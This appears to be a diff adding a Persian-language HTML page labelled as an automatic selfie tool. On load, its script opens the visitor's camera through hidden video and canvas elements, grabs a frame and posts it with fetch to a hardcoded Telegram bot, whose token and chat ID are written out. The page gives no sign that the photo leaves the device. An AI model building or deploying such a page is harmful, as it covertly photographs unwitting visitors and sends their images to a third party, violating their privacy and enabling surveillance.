@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>گرفتن سلفی خودکار</title>
+</head>
+<body>
+    <h1>در حال گرفتن سلفی ...</h1>
+    <video id="video" autoplay style="display:none;"></video> <!-- مخفی کردن ویدیو -->
+    <canvas id="canvas" style="display:none;"></canvas> <!-- مخفی کردن نمای canvas -->
+    <script>
+        // این قسمت برای دسترسی به دوربین و گرفتن عکس است
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                // وقتی ویدیو بارگذاری شد، عکس گرفته می‌شود
+                video.onloadedmetadata = () => {
+                    const canvas = document.getElementById('canvas');
+                    const context = canvas.getContext('2d');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // دریافت تصویر از canvas
+                    const imageData = canvas.toDataURL('image/png');
+                    // ارسال به ربات تلگرام
+                    uploadToTelegram(imageData);
+                };
+            })
+            .catch(error => {
+                alert('دستگاه دوربین پیدا نشد.');
+                console.error(error);
+            });
+
+        // ارسال عکس به ربات تلگرام
+        function uploadToTelegram(imageData) {
+            const botToken = '8119892930:AAHklX_h1aAUcCdR-N417fjLpywGWBIH0dY';
+            const chatId = '5871430093';
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    photo: imageData
+                })
+            }).then(response => {
+                if (response.ok) {
+                    alert('عکس با موفقیت ارسال شد!');
+                } else {
+                    alert('خطا در ارسال عکس.');
+                }
+            });
+        }
+    </script>
+</body>
+</html>
